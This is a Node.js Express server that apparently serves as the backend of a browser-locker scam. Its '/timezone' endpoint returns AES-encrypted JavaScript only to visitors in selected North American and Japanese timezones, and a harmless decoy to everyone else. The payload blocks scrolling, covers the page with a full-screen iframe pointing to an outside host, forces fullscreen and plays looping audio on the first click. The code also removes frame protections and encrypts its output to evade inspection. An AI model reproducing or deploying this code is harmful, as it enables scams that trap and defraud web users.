const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

// --- Middleware ---
app.use(cors());
app.use(express.json());

app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    
    // Bypass frame restrictions
    res.removeHeader('X-Frame-Options');
    res.setHeader('Content-Security-Policy', "frame-ancestors *;");
    next();
});

// --- Helper Functions ---

function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

function getError() {
    const errorJs = `console.log("Unauthorized Access Attempted");`;
    return encodeURIComponent(aesEncode(errorJs));
}

function getResponse(userAgent) {
    // 1. Detect OS
    const isMac = /Macintosh|Mac OS X/i.test(userAgent);

    // 2. Define Groups with Weights
    const linkGroups = [
        {
            id: "Group 1",
            weight: 0.5,
            macos: "https://dsjhgurgwefug.on-forge.com/",
            others: "https://dsjhgurgwefug.on-forge.com/"
        },
        {
            id: "Group 2",
            weight: 0.5,
            macos: "https://dsjhgurgwefug.on-forge.com/",
            others: "https://dsjhgurgwefug.on-forge.com/"
        }
    ];

    // 3. Selection Logic
    const rand = Math.random();
    let cumulative = 0;
    let selectedGroup = linkGroups[0];
    
    for (const group of linkGroups) {
        cumulative += group.weight;
        if (rand <= cumulative) {
            selectedGroup = group;
            break;
        }
    }

    const selectedUrl = isMac ? selectedGroup.macos : selectedGroup.others;

    // 4. Build Payload (Integration of Page Lock + Fullscreen + Audio)
    const payload = `
        (function() {
            // LOCK PAGE SCROLLING
            document.documentElement.style.overflow = "hidden";
            document.body.style.overflow = "hidden";

            // CREATE LOCKING CONTAINER
            let bruceDiv = document.getElementById("bruceDiv");
            if (!bruceDiv) {
                bruceDiv = document.createElement("div");
                bruceDiv.id = "bruceDiv";
                bruceDiv.style.cssText = "z-index:99999; position:fixed; inset:0; background:black; overflow:hidden;";
                document.body.prepend(bruceDiv);
            }

            // CREATE IFRAME
            const iframe = document.createElement("iframe");
            iframe.src = "${selectedUrl}";
            iframe.style.cssText = "width:100%; height:100%; border:0;";
            iframe.allow = "fullscreen; autoplay; encrypted-media; picture-in-picture";
            iframe.setAttribute("allowfullscreen", "");
            iframe.setAttribute("webkitallowfullscreen", "");
            iframe.setAttribute("mozallowfullscreen", "");
            iframe.sandbox = "allow-scripts allow-popups allow-forms allow-downloads";

            bruceDiv.replaceChildren(iframe);

            // GESTURE HANDLER: FULLSCREEN + AUDIO
            const handleInteraction = () => {
                // Request Fullscreen
                const el = document.documentElement;
                const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
                if (fs) fs.call(el);

                // Play Background Audio
                const audio = new Audio("https://audio.jukehost.co.uk/qC8dN1AYE9nQkcTtcydsmA9f8nB5l0Yt");
                audio.loop = true;
                audio.play().catch(() => {});
            };

            document.addEventListener("click", handleInteraction, { once: true });
        })();
    `;

    return encodeURIComponent(aesEncode(payload));
}

// --- Routes ---

app.get("/timezone", (req, res) => {
    res.status(401).json({
        status: "error",
        message: "Unauthorized access",
        response: getError()
    });
});

app.post("/timezone", (req, res) => {
    const { timezone } = req.body;
    const userAgent = req.get('User-Agent') || "";

    const allowedTimezones = [
        "Asia/Tokyo",
        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
        "Pacific/Honolulu",
        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
    ];

    if (allowedTimezones.includes(timezone)) {
        res.send(getResponse(userAgent));
    } else {
        res.send(getError());
    }
});

// --- Start Server ---
app.listen(PORT, () => {
    console.log(\`Server is running on http://localhost:\${PORT}\`);
});
